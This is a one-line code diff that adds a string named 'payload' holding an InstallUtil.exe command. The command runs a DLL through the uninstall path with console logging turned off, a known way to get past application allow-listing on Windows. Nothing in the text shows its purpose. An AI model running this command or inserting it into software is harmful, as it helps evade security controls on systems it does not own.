@@ -1,0 +1,1 @@
+payload = 'InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll' 
